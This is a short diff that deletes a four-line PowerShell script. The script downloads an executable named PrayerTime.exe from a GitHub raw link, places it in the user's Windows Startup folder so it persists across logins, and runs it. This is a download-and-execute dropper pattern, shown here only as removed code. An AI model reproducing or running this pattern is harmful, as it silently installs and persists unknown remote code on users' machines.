@@ -1,4 +1,0 @@
-$url = "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/PrayerTime.exe"
-$dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PrayerTime.exe"
-Invoke-WebRequest -Uri $url -OutFile $dest
-Start-Process $dest
